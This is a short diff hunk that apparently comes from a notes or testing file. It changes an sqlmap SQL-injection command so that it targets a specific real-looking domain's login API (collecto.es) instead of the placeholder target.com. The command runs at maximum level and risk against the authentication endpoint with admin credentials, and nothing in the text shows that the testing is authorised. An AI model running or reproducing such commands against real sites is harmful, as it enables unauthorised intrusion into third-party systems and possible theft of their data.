@@ -44,6 +44,6 @@ Priority: u=1, i
 -----
 
 
-sqlmap -u "http://target.com/api/auth/login" --data '{"username":"admin","password":"123456"}' --headers="Content-Type: application/json"  --level=5 --risk=3 --technique=BEUST
+sqlmap -u "https://collecto.es/api/auth/login" --data '{"username":"admin","password":"123456"}' --headers="Content-Type: application/json"  --level=5 --risk=3 --technique=BEUST
 
 ----------
